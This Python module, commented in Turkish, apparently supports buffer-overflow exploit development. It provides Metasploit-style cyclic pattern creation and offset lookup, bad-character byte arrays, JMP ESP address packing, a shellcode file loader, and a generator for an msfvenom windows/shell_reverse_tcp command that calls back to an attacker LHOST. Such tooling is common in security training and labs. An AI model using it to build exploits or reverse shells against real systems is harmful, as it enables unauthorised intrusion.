#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious yardımcı fonksiyonlar - pattern üreteci, hex dump, adres dönüştürücü
"""

import struct
import string
from typing import List, Optional


def desen_olustur(uzunluk: int) -> str:
    """
    metasploit pattern_create benzeri benzersiz döngüsel desen üretir

    üretilen desen her 3 karakterlik alt dizinin benzersiz olmasını garanti eder,
    böylece eip'de bulunan 4 byte'lık değer ile kesin offset hesaplanabilir.

    parametreler:
        uzunluk: üretilecek desenin karakter uzunluğu

    döndürür:
        benzersiz döngüsel desen stringi

    örnek:
        >>> desen_olustur(20)
        'Aa0Aa1Aa2Aa3Aa4Aa5Aa'
    """
    # karakter setleri (metasploit ile uyumlu)
    buyuk_harfler = string.ascii_uppercase  # a-z
    kucuk_harfler = string.ascii_lowercase  # a-z
    rakamlar = string.digits               # 0-9

    desen = []
    sayac = 0

    for bh in buyuk_harfler:
        for kh in kucuk_harfler:
            for r in rakamlar:
                if sayac >= uzunluk:
                    return "".join(desen)
                desen.append(bh)
                sayac += 1
                if sayac >= uzunluk:
                    return "".join(desen)
                desen.append(kh)
                sayac += 1
                if sayac >= uzunluk:
                    return "".join(desen)
                desen.append(r)
                sayac += 1

    return "".join(desen)


def desen_bul(eip_degeri: str, desen: Optional[str] = None, uzunluk: int = 20000) -> int:
    """
    metasploit pattern_offset benzeri - eip değerinden offset hesaplar

    parametreler:
        eip_degeri: eip register değeri (hex string, ör: "386F4337")
        desen: aranacak desen (none ise otomatik üretilir)
        uzunluk: otomatik üretilecek desenin uzunluğu

    döndürür:
        bulunan offset değeri

    istisnalar:
        ValueError: desen içinde eip değeri bulunamazsa

    örnek:
        >>> desen_bul("386F4337")
        2003
    """
    if desen is None:
        desen = desen_olustur(uzunluk)

    # hex string'i byte'lara çevir ve ascii karakter olarak yorumla
    try:
        # hex string'den byte'lara dönüştür
        ham_baytlar = bytes.fromhex(eip_degeri)
    except ValueError:
        raise ValueError(f"geçersiz hex değeri: {eip_degeri}")

    # little-endian: byte sırasını ters çevir
    ters_baytlar = ham_baytlar[::-1]

    try:
        aranan = ters_baytlar.decode("ascii")
    except UnicodeDecodeError:
        raise ValueError(f"eip değeri ascii karakterlere dönüştürülemiyor: {eip_degeri}")

    konum = desen.find(aranan)

    if konum == -1:
        raise ValueError(
            f"eip değeri '{eip_degeri}' desen içinde bulunamadı "
            f"(desen uzunluğu: {len(desen)})"
        )

    return konum


def kotu_karakter_olustur(haric_listesi: Optional[List[int]] = None) -> bytes:
    """
    kötü karakter test byte dizisi oluşturur

    \\x00 (null byte) varsayılan olarak her zaman hariç tutulur.
    ek olarak kullanıcının belirlediği byte'lar da çıkarılabilir.

    parametreler:
        haric_listesi: hariç tutulacak byte değerlerinin listesi (ör: [0x00, 0x0a, 0x0d])

    döndürür:
        test için kullanılacak byte dizisi

    örnek:
        >>> kotu_karakter_olustur([0x0a, 0x0d])  # null, lf ve cr hariç
    """
    if haric_listesi is None:
        haric_listesi = []

    # null byte her zaman hariç
    haric_seti = set(haric_listesi) | {0x00}

    karakter_dizisi = bytearray()
    for bayt in range(0x01, 0x100):
        if bayt not in haric_seti:
            karakter_dizisi.append(bayt)

    return bytes(karakter_dizisi)


def hex_goster(veri: bytes, satir_genisligi: int = 16) -> str:
    """
    byte verisini okunabilir hex dump formatında gösterir

    parametreler:
        veri: gösterilecek byte verisi
        satir_genisligi: her satırdaki byte sayısı

    döndürür:
        formatlanmış hex dump stringi

    örnek:
        >>> print(hex_goster(b"\\x41\\x42\\x43\\x00\\x0a"))
        00000000  41 42 43 00 0a                                    |ABC..|
    """
    satirlar = []

    for satir_baslangici in range(0, len(veri), satir_genisligi):
        parca = veri[satir_baslangici:satir_baslangici + satir_genisligi]

        # hex kısmı
        hex_kismi = " ".join(f"{bayt:02x}" for bayt in parca)
        hex_kismi = hex_kismi.ljust(satir_genisligi * 3 - 1)

        # ascii kısmı (yazdırılamayan karakterler nokta ile gösterilir)
        ascii_kismi = ""
        for bayt in parca:
            if 0x20 <= bayt <= 0x7E:
                ascii_kismi += chr(bayt)
            else:
                ascii_kismi += "."

        satirlar.append(f"{satir_baslangici:08x}  {hex_kismi}  |{ascii_kismi}|")

    return "\n".join(satirlar)


def adres_pakitle(adres_str: str) -> bytes:
    """
    hex adres stringini little-endian byte dizisine dönüştürür

    jmp esp gibi adresleri struct.pack ile doğru formata çevirir.

    parametreler:
        adres_str: hex adres stringi (ör: "625011af" veya "0x625011af")

    döndürür:
        little-endian formatında 4 byte

    örnek:
        >>> adres_pakitle("625011af")
        b'\\xaf\\x11\\x50\\x62'
    """
    # 0x önekini temizle
    adres_str = adres_str.strip().lower()
    if adres_str.startswith("0x"):
        adres_str = adres_str[2:]

    try:
        adres_degeri = int(adres_str, 16)
    except ValueError:
        raise ValueError(f"geçersiz hex adresi: {adres_str}")

    # 32-bit adres kontrolü
    if adres_degeri > 0xFFFFFFFF:
        raise ValueError(f"adres 32-bit sınırını aşıyor: 0x{adres_degeri:x}")

    return struct.pack("<I", adres_degeri)


def msfvenom_onerisi(
    yerel_ip: str,
    yerel_port: int = 4444,
    kotu_karakterler: str = "\\x00",
    platform: str = "windows",
    mimari: str = "x86",
) -> str:
    """
    msfvenom shellcode üretim komutunu otomatik oluşturur

    parametreler:
        yerel_ip: saldırganın ip adresi
        yerel_port: dinlenecek port (varsayılan 4444)
        kotu_karakterler: hariç tutulacak byte'lar (ör: "\\x00\\x0a")
        platform: hedef platform (varsayılan windows)
        mimari: hedef mimari (varsayılan x86)

    döndürür:
        çalıştırılabilir msfvenom komutu
    """
    if platform == "windows":
        payload = "windows/shell_reverse_tcp"
    else:
        payload = "linux/x86/shell_reverse_tcp"

    komut = (
        f"msfvenom -p {payload} "
        f"LHOST={yerel_ip} LPORT={yerel_port} "
        f"EXITFUNC=thread "
        f"-f python "
        f"-a {mimari} "
        f"-b \"{kotu_karakterler}\""
    )

    return komut


def payload_dosyadan_oku(dosya_yolu: str) -> bytes:
    """
    shellcode payload'ını dosyadan okur

    python formatındaki (msfvenom -f python çıktısı) veya ham binary
    dosyaları destekler.

    parametreler:
        dosya_yolu: payload dosyasının yolu

    döndürür:
        shellcode byte verisi

    istisnalar:
        FileNotFoundError: dosya bulunamazsa
        ValueError: dosya formatı tanınmazsa
    """
    with open(dosya_yolu, "rb") as dosya:
        icerik = dosya.read()

    # ham binary dosya ise doğrudan döndür
    try:
        metin = icerik.decode("utf-8").strip()
    except UnicodeDecodeError:
        return icerik

    # python format kontrolü (msfvenom -f python çıktısı)
    # hem "buf += "\x..."" hem de "buf = b"\x..."" formatlarını destekler
    if "\\x" in metin:
        # buf değişkenindeki tüm hex byte'ları birleştir
        toplam_baytlar = bytearray()
        for satir in metin.splitlines():
            # "buf += " veya "buf = " ile başlayan satırları bul
            if "=" in satir and "\\x" in satir:
                # b"..." prefix'ini temizle (yeni msfvenom formatı)
                temiz_satir = satir.replace('b"', '"').replace("b'", "'")
                # tırnak içindeki kısmı çıkar
                for tirnak in ['"', "'"]:
                    baslangic = temiz_satir.find(tirnak)
                    bitis = temiz_satir.rfind(tirnak)
                    if baslangic != -1 and bitis > baslangic:
                        hex_kisim = temiz_satir[baslangic + 1:bitis]
                        # \x kaçış dizilerini byte'a çevir
                        hex_kisim = hex_kisim.replace("\\x", "")
                        try:
                            toplam_baytlar.extend(bytes.fromhex(hex_kisim))
                        except ValueError:
                            pass
                        break

        if toplam_baytlar:
            return bytes(toplam_baytlar)

    # tanınmayan format
    raise ValueError(f"dosya formatı tanınamadı: {dosya_yolu}")
